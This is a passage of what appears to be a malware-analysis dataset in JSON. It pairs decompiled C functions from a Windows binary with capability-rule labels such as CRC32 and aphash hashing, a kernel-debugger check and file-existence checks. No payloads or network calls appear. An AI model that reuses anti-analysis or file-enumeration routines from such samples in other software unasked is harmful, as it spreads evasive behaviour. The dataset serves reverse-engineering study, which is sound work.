        "decompiled_code": "\nvoid __cdecl fcn.004179bb(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    code **arg_8h_00;\n    code *pcVar2;\n    int32_t unaff_EBP;\n    \n    fcn.00420895(0);\n    uVar1 = *(unaff_EBP + 0xc);\n    arg_8h_00 = *(unaff_EBP + 8);\n    fcn.0041502f(arg_8h_00);\n    pcVar2 = NULL;\n    *arg_8h_00 = vtable.std::basic_stringbuf_char__struct_std::char_traits_char___class_std::allocator_char__.0;\n    if ((uVar1 & 1) == 0) {\n        pcVar2 = 0x4;\n    }\n    if ((uVar1 & 2) == 0) {\n        pcVar2 = pcVar2 | 2;\n    }\n    if ((uVar1 & 8) != 0) {\n        pcVar2 = pcVar2 | 8;\n    }\n    if ((uVar1 & 4) != 0) {\n        pcVar2 = pcVar2 | 0x10;\n    }\n    arg_8h_00[0xf] = NULL;\n    arg_8h_00[0x10] = pcVar2;\n    fcn.00420934();\n    return;\n}\n",
        "token_count": 312
    },
    "0041ac8e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041ac8e(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    int32_t in_EAX;\n    uint32_t uVar5;\n    uint16_t *var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    var_8h = 0;\n    var_ch = 0;\n    var_1h._0_1_ = 0;\n    if (*(in_EAX + 0x1af2c) != 0) {\n        var_10h = in_EAX + 0x9f2c;\n        do {\n            if ((var_8h & 7) == 0) {\n                var_1h._0_1_ = *(var_ch + 0x19f2c + in_EAX);\n                var_ch = var_ch + 1;\n            }\n            uVar3 = var_8h + 1;\n            uVar5 = *(in_EAX + 0x1f2c + var_8h);\n            if ((var_1h & 1) == 0) {\n                uVar5 = *(arg_8h + uVar5 * 4 + 2);\ncode_r0x0041ad83:\n                fcn.0041ae0c(uVar5);\n            }\n            else {\n                uVar5 = *(uVar5 + 0x1b3d + in_EAX);\n                fcn.0041ae0c(*(arg_8h + 0x406 + uVar5 * 4));\n                iVar2 = *(uVar5 * 4 + 0x43bdc8);\n                if (iVar2 != 0) {\n                    fcn.0041ae0c(iVar2);\n                }\n                uVar1 = *var_10h;\n                var_10h = var_10h + 1;\n                if (uVar1 < 0x100) {\n                    uVar4 = *(uVar1 + 0x1c3d + in_EAX);\n                }\n                else {\n                    uVar4 = *((uVar1 >> 7) + 0x1d3d + in_EAX);\n                }\n                fcn.0041ae0c(*(arg_ch + uVar4 * 4 + 2));\n                uVar5 = *(uVar4 * 4 + 0x43be50);\n                if (uVar5 != 0) goto code_r0x0041ad83;\n            }\n            var_1h._0_1_ = var_1h >> 1;\n            var_8h = uVar3;\n        } while (uVar3 < *(in_EAX + 0x1af2c));\n    }\n    fcn.0041ae0c(*(arg_8h + 0x402));\n    return;\n}\n",
        "token_count": 688
    },
    "0041e85d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041e85d(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    code *var_10h;\n    char *var_4h;\n    \n    do {\n        iVar2 = fcn.0041e0ea(arg_8h);\n        if (iVar2 != 0) {\n            return;\n        }\n        iVar2 = fcn.00423651(arg_8h);\n    } while (iVar2 != 0);\n    if ((*0x444cbc & 1) == 0) {\n        *0x444cbc = *0x444cbc | 1;\n        var_4h = \"bad allocation\";\n        fcn.0041e17e(&var_4h);\n        *0x444cb0 = vtable.std::bad_alloc.0;\n        fcn.0041eeb1(0x433000);\n    }\n    fcn.0041e28b(0x444cb0);\n    var_10h = vtable.std::bad_alloc.0;\n    fcn.00420046(&var_10h, 0x4403d8);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 273
    },
    "00426ef1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00426ef1(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00425be0(0x4401f0, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.004221c9();\n        *puVar2 = 0;\n        puVar2 = fcn.004221b6();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x456fd0)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x456fe0;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.0042ce0b(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.004221b6();\n                    *puVar2 = 9;\n                    puVar2 = fcn.004221c9();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.004267f4(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.00426fbd();\n                goto code_r0x00426fb4;\n            }\n        }\n        puVar2 = fcn.004221c9();\n        *puVar2 = 0;\n        puVar2 = fcn.004221b6();\n        *puVar2 = 9;\n        fcn.00423a7a();\n    }\ncode_r0x00426fb4:\n    fcn.00425c25();\n    return;\n}\n",
        "token_count": 613
    },
    "0042b7f7": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0042b7f7(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00425be0(0x4402b0, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.004221c9();\n        *puVar2 = 0;\n        puVar2 = fcn.004221b6();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x456fd0)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x456fe0;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.0042ce0b(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.004221b6();\n                    *puVar2 = 9;\n                    puVar2 = fcn.004221c9();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.0042b782(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.0042b8c3();\n                goto code_r0x0042b8ba;\n            }\n        }\n        puVar2 = fcn.004221c9();\n        *puVar2 = 0;\n        puVar2 = fcn.004221b6();\n        *puVar2 = 9;\n        fcn.00423a7a();\n    }\ncode_r0x0042b8ba:\n    fcn.00425c25();\n    return;\n}\n",
        "token_count": 619
    },
    "00404338": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404338(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    code *var_ch;\n    \n    if ((arg_8h != 0) && (iVar1 = fcn.0041e85d(arg_8h),  iVar1 == 0)) {\n        arg_8h = 0;\n        fcn.0041e206(&arg_8h);\n        var_ch = vtable.std::bad_alloc.0;\n        fcn.00420046(&var_ch, 0x4403d8);\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "004068b4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.004068b4(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint *puVar4;\n    int32_t var_9ch;\n    int32_t var_98h;\n    uint var_94h;\n    int32_t var_90h;\n    int32_t var_80h;\n    int32_t var_7ch;\n    int32_t var_78h;\n    uint var_20h;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    \n    if (arg_8h != 0) {\n        var_8h = 0;\n        var_9ch = 0;\n        fcn.004257d0(&var_98h, 0, 0x7c);\n        var_18h = fcn.00406781(arg_8h);\n        if ((var_18h == -1) || (iVar1 = fcn.004065e2(),  iVar1 != 0)) {\n            var_8h = -1;\n        }\n        else {\n            iVar1 = fcn.00406717();\n            if (iVar1 != 0) {\n                var_8h = -1;\n            }\n        }\n        var_ch = 0;\n        if ((var_8h == 0) && (iVar1 = fcn.004066db(arg_8h),  iVar1 != 0)) {\n            var_8h = -1;\n        }\n        var_10h = 0;\n        if ((var_8h == 0) &&\n           ((iVar1 = fcn.004066db(arg_8h),  iVar1 != 0 || (iVar1 = fcn.004066db(arg_8h),  iVar1 != 0)))) {\n            var_8h = -1;\n        }\n        var_14h = 0;\n        if ((((((var_8h == 0) && (iVar1 = fcn.004066db(arg_8h),  iVar1 == 0)) && (var_14h == var_98h)) &&\n             ((var_10h == 0 && (var_ch == 0)))) &&\n            ((iVar1 = fcn.00406717(),  iVar1 == 0 &&\n             ((iVar1 = fcn.00406717(),  iVar1 == 0 && (iVar1 = fcn.004066db(arg_8h),  iVar1 == 0)))))) &&\n           (iVar1 = *(arg_8h + 0xc),  var_7ch + var_78h <= iVar1 + var_18h)) {\n            var_20h = 0;\n            *(arg_8h + 0xc) = 0;\n            var_90h = ((iVar1 - var_7ch) - var_78h) + var_18h;\n            var_9ch = arg_8h;\n            var_80h = var_18h;\n            puVar2 = fcn.0041e0ea(0x80);\n            puVar3 = &var_9ch;\n            puVar4 = puVar2;\n            for (iVar1 = 0x20; iVar1 != 0; iVar1 = iVar1 + -1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n            fcn.00406c54();\n            return puVar2;\n        }\n        fcn.004065c1();\n    }\n    return NULL;\n}\n",
        "token_count": 822
    },
    "004073a9": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004073a9(uint param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    ushort *arg_8h;\n    int32_t iVar3;\n    int32_t *unaff_ESI;\n    uint unaff_retaddr;\n    \n    if ((*unaff_ESI == 0) && (unaff_ESI[1] == -1)) {\n        (**0x446324)(0x103, unaff_ESI + 0x50);\n        piVar1 = unaff_ESI + 0x50;\n        do {\n            piVar2 = piVar1;\n            piVar1 = piVar2 + 1;\n        } while (*piVar2 != '\\0');\n        if ((*(piVar2 + -1) != '\\\\') && (*(piVar2 + -1) != '/')) {\n            *piVar2 = 0x2f;\n        }\n        arg_8h = fcn.0041e85d(0x20);\n        *(arg_8h + 10) = param_1;\n        *arg_8h = 0x100;\n        *(arg_8h + 8) = 0;\n        *(arg_8h + 0xc) = unaff_retaddr;\n        *(arg_8h + 0xe) = 0;\n        *(arg_8h + 6) = 0;\n        iVar3 = fcn.004068b4(arg_8h);\n        *unaff_ESI = iVar3;\n        iVar3 = (-(iVar3 != 0) & 0xfffffe00) + 0x200;\n    }\n    else {\n        iVar3 = 0x1000000;\n    }\n    return iVar3;\n}\n",
        "token_count": 388
    },
    "004079f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004079f0(uint *arg_8h, uint *arg_ch)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    char *in_ECX;\n    int32_t *in_EDX;\n    uint unaff_EBX;\n    uint var_114h;\n    uint var_110h;\n    uint32_t var_4h;\n    \n    var_4h = *0x443674 ^ &stack0xfffffffc;\n    iVar2 = &var_110h - in_ECX;\n    do {\n        cVar1 = *in_ECX;\n        in_ECX[iVar2] = cVar1;\n        in_ECX = in_ECX + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = fcn.00406cda(&var_110h, 2);\n    if (iVar2 == 0) {\n        if (in_EDX[1] != -1) {\n            fcn.0040734c();\n        }\n        in_EDX[1] = -1;\n        arg_8h_00 = *(*in_EDX + 0x10);\n        if (arg_8h != NULL) {\n            *arg_8h = arg_8h_00;\n        }\n        if (arg_ch != NULL) {\n            fcn.00407439(arg_8h_00);\n        }\n    }\n    else {\n        if (arg_8h != NULL) {\n            *arg_8h = 0xffffffff;\n        }\n        if (arg_ch != NULL) {\n            fcn.004257d0(arg_ch, 0, 300);\n            *arg_ch = 0xffffffff;\n        }\n    }\n    fcn.0041e0a1(unaff_EBX);\n    return;\n}\n",
        "token_count": 396
    },
    "004083d1": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004083d1(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint uVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t unaff_EBP;\n    uint var_798h;\n    uint var_794h;\n    uint var_790h;\n    uint var_78ch;\n    uint var_788h;\n    uint var_784h;\n    uint var_768h;\n    uint var_74ch;\n    uint var_738h;\n    uint var_730h;\n    uint var_720h;\n    uint var_71ch;\n    uint var_714h;\n    uint var_32ch;\n    uint var_224h;\n    uint var_11ch;\n    uint var_4h;\n    \n    fcn.004208fe(0x78c);\n    *(unaff_EBP + -0x790) = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x798) = *(unaff_EBP + 0xc);\n    fcn.004257d0(unaff_EBP + -0x224, 0, 0x104);\n    fcn.004257d0(unaff_EBP + -0x11c, 0, 0x104);\n    *(unaff_EBP + -0x794) = 0;\n    *(unaff_EBP + -0x78c) = 0;\n    uVar2 = fcn.00416c79(0x1a);\n    (**0x4464ac)(unaff_EBP + -0x224, uVar2);\n    (**0x4464ac)(unaff_EBP + -0x224, *0x445d70);\n    (**0x4464ac)(unaff_EBP + -0x11c, unaff_EBP + -0x224);\n    (**0x4464ac)(unaff_EBP + -0x11c, 0x43bd7c);\n    (**0x4464ac)(unaff_EBP + -0x11c, *0x445d10);\n    pcVar3 = unaff_EBP + -0x11c;\n    *(unaff_EBP + -0x71c) = 0xf;\n    *(unaff_EBP + -0x720) = 0;\n    *(unaff_EBP + -0x730) = 0;\n    do {\n        cVar1 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar1 != '\\0');\n    iVar4 = pcVar3 - (unaff_EBP + -0x11b);\n    fcn.00403fb5(unaff_EBP + -0x11c, iVar4);\n    *(unaff_EBP + -4) = 0;\n    puVar5 = fcn.00416865(unaff_EBP + -0x768);\n    if (7 < puVar5[5]) {\n        puVar5 = *puVar5;\n    }\n    uVar6 = (**0x4462f0)(puVar5);\n    if ((uVar6 == 0xffffffff) || (*(unaff_EBP + -0x788) = 1,  (uVar6 & 0x10) != 0)) {\n        *(unaff_EBP + -0x788) = 0;\n    }\n    fcn.0040c0f0(1);\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00403f73(1, 0);\n    if ((*(unaff_EBP + -0x788) != 0) && (iVar7 = fcn.0040e80b(unaff_EBP + -0x11c, unaff_EBP + -0x78c),  iVar7 != 0)) {\n        *(unaff_EBP + -0x71c) = 0xf;\n        *(unaff_EBP + -0x720) = 0;\n        *(unaff_EBP + -0x730) = 0;\n        fcn.00403f50(*(unaff_EBP + -0x790));\n        *(unaff_EBP + -4) = 1;\n        fcn.004164e6(unaff_EBP + -0x74c, unaff_EBP + -0x730);\n        *(unaff_EBP + -4) = 3;\n        fcn.00403f73(1, 0);\n        fcn.004257d0(unaff_EBP + -0x32c, 0, 0x104);\n        (**0x4464ac)(unaff_EBP + -0x32c, *0x445a70);\n        iVar7 = unaff_EBP + -0x74c;\n        iVar4 = fcn.0040bfb7(iVar4, unaff_EBP + -0x32c, 0);\n        if (iVar4 != -1) {\n            fcn.0040415d(0, iVar4 + 0xc);\n            iVar7 = 0x78;\n            fcn.0040415d(0x78, 0xffffffff);\n            iVar4 = *(unaff_EBP + -0x74c);\n            if (*(unaff_EBP + -0x738) < 0x10) {\n                iVar4 = unaff_EBP + -0x74c;\n            }\n            iVar4 = fcn.0040e6b5(iVar4);\n            if (iVar4 != 0) {\n                fcn.004257d0(unaff_EBP + -0x714, 0, 1000);\n                puVar5 = fcn.0040e9b3(*(unaff_EBP + -0x788), *(unaff_EBP + -0x794));\n                *(unaff_EBP + -4) = 4;\n                if (0xf < puVar5[5]) {\n                    puVar5 = *puVar5;\n                }\n                (**0x4464ac)(unaff_EBP + -0x714, puVar5);\n                *(unaff_EBP + -4) = 3;\n                fcn.00403f73(1, 0);\n                uVar2 = *(unaff_EBP + -0x798);\n                (**0x4464ac)(uVar2, *0x445ec4);\n                iVar4 = (**0x4464dc)(unaff_EBP + -0x714, \"NULL\");\n                if (iVar4 == 0) {\n                    iVar4 = *(unaff_EBP + -0x74c);\n                    if (*(unaff_EBP + -0x738) < 0x10) {\n                        iVar4 = unaff_EBP + -0x74c;\n                    }\n                    (**0x4464ac)(uVar2, iVar4);\n                }\n                else {\n                    puVar5 = fcn.0040e9b3(*(unaff_EBP + -0x788), *(unaff_EBP + -0x794));\n                    *(unaff_EBP + -4) = 5;\n                    if (0xf < puVar5[5]) {\n                        puVar5 = *puVar5;\n                    }\n                    (**0x4464ac)(uVar2, puVar5);\n                    *(unaff_EBP + -4) = 3;\n                    fcn.00403f73(1, 0);\n                }\n                (**0x4464ac)(uVar2, 0x43bd78);\n            }\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.00403f73(1, 0, iVar7);\n    }\n    fcn.0040e771();\n    fcn.00420948();\n    return;\n}\n",
        "token_count": 1753
    },
    "00408768": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00408768(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_57ch;\n    uint var_578h;\n    uint var_574h;\n    uint var_548h;\n    uint var_434h;\n    uint var_32ch;\n    uint var_224h;\n    uint var_11ch;\n    uint var_4h;\n    \n    fcn.004208fe(0x570);\n    *(unaff_EBP + -0x57c) = extraout_ECX;\n    *(unaff_EBP + -4) = 0;\n    uVar1 = (**0x446508)(0, 9999999);\n    uVar1 = (**0x446490)(uVar1);\n    (**0x446300)(unaff_EBP + -0x32c, \"%s\\\\*\", extraout_ECX);\n    iVar2 = (**0x44656c)(unaff_EBP + -0x32c, unaff_EBP + -0x574);\n    *(unaff_EBP + -0x578) = iVar2;\n    if (iVar2 != -1) {\n        do {\n            iVar2 = (**0x4464dc)(unaff_EBP + -0x548, 0x43df80);\n            if ((iVar2 != 0) && (iVar2 = (**0x4464dc)(unaff_EBP + -0x548, 0x43df84),  iVar2 != 0)) {\n                (**0x446300)(unaff_EBP + -0x434, \"%s\\\\%s\", *(unaff_EBP + -0x57c), unaff_EBP + -0x548);\n                fcn.004257d0(unaff_EBP + -0x11c, 0, 0x104);\n                (**0x4464ac)(unaff_EBP + -0x11c, *0x446038);\n                uVar3 = fcn.00416673();\n                (**0x4464ac)(unaff_EBP + -0x11c, uVar3);\n                (**0x446354)(unaff_EBP + -0x434, unaff_EBP + -0x11c, 1);\n                fcn.004083d1(unaff_EBP + -0x11c, uVar1);\n                (**0x4463b0)(unaff_EBP + -0x11c);\n            }\n            iVar2 = (**0x4463c4)(*(unaff_EBP + -0x578), unaff_EBP + -0x574);\n        } while (iVar2 != 0);\n        (**0x446334)(*(unaff_EBP + -0x578));\n        fcn.004257d0(unaff_EBP + -0x224, 0, 0x104);\n        (**0x4464ac)(unaff_EBP + -0x224, *0x446214);\n        uVar1 = (**0x4463a4)(uVar1);\n        fcn.0041d4dc(unaff_EBP + -0x224, uVar1, 3);\n    }\n    fcn.00403f73(1, 0);\n    fcn.00420948();\n    return;\n}\n",
        "token_count": 762
    },
    "00408912": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h_2\n\nvoid fcn.00408912(void)\n\n{\n    uint32_t uVar1;\n    uint var_4h;\n    uchar auStackY9012 [1000];\n    uchar auStackY8012 [244];\n    uint var_1f48h;\n    uint var_1b60h;\n    uint var_1778h;\n    uint var_1390h;\n    uint var_fa8h_2;\n    uint var_fa8h;\n    uint var_bc0h_2;\n    uint var_bc0h;\n    uint var_7d8h_2;\n    uint var_7d8h;\n    uint var_3f0h;\n    uint uStackY260;\n    uchar *puVar2;\n    uchar *arg_8h;\n    uint var_4h_2;\n    \n    fcn.0042cc70();\n    fcn.004257d0();\n    fcn.004257d0();\n    fcn.004257d0();\n    fcn.004257d0();\n    fcn.004257d0();\n    fcn.004257d0();\n    fcn.004257d0();\n    fcn.004257d0();\n    fcn.004257d0();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    (**0x4464ac)();\n    arg_8h = &stack0xffffe0b4;\n    (**0x4464ac)();\n    uVar1 = (**0x4463fc)();\n    if ((uVar1 != 0xffffffff) && ((uVar1 & 0x10) == 0)) {\n        puVar2 = &stack0xffffdccc;\n        fcn.00403f50();\n        fcn.00408768(puVar2);\n    }\n    uVar1 = (**0x4463fc)();\n    if ((uVar1 != 0xffffffff) && ((uVar1 & 0x10) == 0)) {\n        puVar2 = &stack0xffffdccc;\n        uStackY260 = 0x408bfd;\n        fcn.00403f50();\n        uStackY260 = 0x408c04;\n        fcn.00408768(puVar2);\n    }\n    fcn.0041e0a1(arg_8h);\n    return;\n}\n",
        "token_count": 689
    },
    "00409d6d": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.00409d6d(uchar *arg_8h)\n\n{\n    char *pcVar1;\n    char **in_EAX;\n    int32_t iVar2;\n    char **ppcVar3;\n    char **ppcVar4;\n    char **var_4h;\n    \n    pcVar1 = in_EAX[4];\n    if (pcVar1 != NULL) {\n        ppcVar4 = in_EAX;\n        if (0xf < in_EAX[5]) {\n            ppcVar4 = *in_EAX;\n        }\n        var_4h = in_EAX;\n        if (0xf < in_EAX[5]) {\n            var_4h = *in_EAX;\n        }\n        for (; var_4h < pcVar1 + ppcVar4; var_4h = var_4h + 1) {\n            iVar2 = fcn.0041ecc0(\" \\n\\r\\t\", *var_4h, 4);\n            if (iVar2 == 0) {\n                ppcVar4 = in_EAX;\n                if (0xf < in_EAX[5]) {\n                    ppcVar4 = *in_EAX;\n                }\n                var_4h = var_4h - ppcVar4;\n                goto code_r0x00409dbf;\n            }\n        }\n    }\n    var_4h = 0xffffffff;\ncode_r0x00409dbf:\n    if (in_EAX[4] == NULL) {\ncode_r0x00409e2d:\n        iVar2 = -1;\n    }\n    else {\n        ppcVar4 = in_EAX;\n        if (0xf < in_EAX[5]) {\n            ppcVar4 = *in_EAX;\n        }\n        ppcVar4 = ppcVar4 + in_EAX[4] + -1;\n        while (iVar2 = fcn.0041ecc0(\" \\n\\r\\t\", *ppcVar4, 4),  iVar2 != 0) {\n            ppcVar3 = in_EAX;\n            if (0xf < in_EAX[5]) {\n                ppcVar3 = *in_EAX;\n            }\n            if (ppcVar4 == ppcVar3) goto code_r0x00409e2d;\n            ppcVar4 = ppcVar4 + -1;\n        }\n        ppcVar3 = in_EAX;\n        if (0xf < in_EAX[5]) {\n            ppcVar3 = *in_EAX;\n        }\n        iVar2 = ppcVar4 - ppcVar3;\n    }\n    pcVar1 = in_EAX[5];\n    if (var_4h == 0xffffffff) {\n        ppcVar4 = in_EAX;\n        if (0xf < pcVar1) {\n            ppcVar4 = *in_EAX;\n        }\n    }\n    else {\n        ppcVar4 = in_EAX;\n        if (0xf < pcVar1) {\n            ppcVar4 = *in_EAX;\n        }\n        ppcVar4 = ppcVar4 + var_4h;\n    }\n    if (iVar2 == -1) {\n        var_4h = in_EAX;\n        if (0xf < pcVar1) {\n            var_4h = *in_EAX;\n        }\n        var_4h = in_EAX[4] + var_4h;\n    }\n    else {\n        if (0xf < pcVar1) {\n            in_EAX = *in_EAX;\n        }\n        var_4h = in_EAX + iVar2 + 1;\n    }\n    *(arg_8h + 0x10) = 0;\n    *(arg_8h + 0x14) = 0xf;\n    *arg_8h = 0;\n    if (ppcVar4 != var_4h) {\n        fcn.00403fb5(ppcVar4, var_4h - ppcVar4);\n    }\n    return arg_8h;\n}\n",
        "token_count": 885
    },
    "0040a67e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2ch_2\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: var_18h_2\n\nvoid __cdecl\nfcn.0040a67e(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint arg_24h_2, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint arg_24h, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint arg_40h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_18h;\n    uint var_18h_3;\n    uint var_4h;\n    uint var_54h;\n    uint var_50h_2;\n    uint var_4ch;\n    uint var_48h;\n    uint var_58h;\n    uint var_50h;\n    uint var_2ch_2;\n    uint var_18h_2;\n    uint var_2ch;\n    uint var_4h_2;\n    \n    fcn.004208fe();\n    *(unaff_EBP + -0x50) = *(unaff_EBP + 0x40);\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x18) = 0xf;\n    *(unaff_EBP + -0x1c) = 0;\n    *(unaff_EBP + -0x2c) = 0;\n    *(unaff_EBP + -0x58) = &stack0xffffffe0;\n    *(unaff_EBP + -4) = 2;\n    *(unaff_EBP + -0x4c) = 0;\n    *(unaff_EBP + -0x54) = 0;\n    fcn.00404397(unaff_EBP + 0x24);\n    fcn.00409eb1(unaff_EBP + -0x48);\n    *(unaff_EBP + -4) = 3;\n    fcn.00403f0c();\n    *(unaff_EBP + -4) = 2;\n    fcn.00403f73();\n    iVar1 = (**0x4464dc)();\n    if (iVar1 != 0) {\n        iVar1 = *(unaff_EBP + 8);\n        if (*(unaff_EBP + 0x1c) < 0x10) {\n            iVar1 = unaff_EBP + 8;\n        }\n        iVar1 = fcn.0040c013(unaff_EBP + -0x2c, iVar1, *(unaff_EBP + 0x18));\n        if (iVar1 != -1) {\n            fcn.0040415d(0, iVar1 + 6);\n            iVar1 = *(unaff_EBP + -0x2c);\n            if (*(unaff_EBP + -0x18) < 0x10) {\n                iVar1 = unaff_EBP + -0x2c;\n            }\n            uVar2 = fcn.0041ebdd(iVar1, *(unaff_EBP + -0x50), unaff_EBP + -0x54);\n            *(unaff_EBP + -0x4c) = uVar2;\n        }\n        iVar1 = (**0x4463a4)(*(unaff_EBP + -0x4c));\n        if (0 < iVar1) {\n            fcn.00403f50();\n            goto code_r0x0040a77a;\n        }\n    }\n    fcn.00403fb5();\ncode_r0x0040a77a:\n    fcn.00403f73(1, 0);\n    fcn.00403f73(1, 0);\n    fcn.00403f73(1, 0);\n    